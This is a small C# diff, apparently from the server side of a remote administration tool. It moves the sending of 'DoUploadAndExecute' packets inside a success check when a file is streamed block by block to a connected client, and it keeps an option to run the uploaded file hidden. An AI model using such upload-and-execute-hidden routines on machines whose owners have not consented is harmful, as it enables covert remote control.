@@ -667,16 +667,19 @@ namespace xServer.Forms
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
                                     byte[] block;
-                                    if (!srcFile.ReadBlock(currentBlock, out block))
+                                    if (srcFile.ReadBlock(currentBlock, out block))
+                                    {
+                                        new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
+                                            Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
+                                            currentBlock, UploadAndExecute.RunHidden).Execute(c);
+                                    }
+                                    else
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                             "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                         error = true;
                                         break;
                                     }
-                                    new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
-                                        Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
-                                        currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                 }
                             }
                         }).Start();
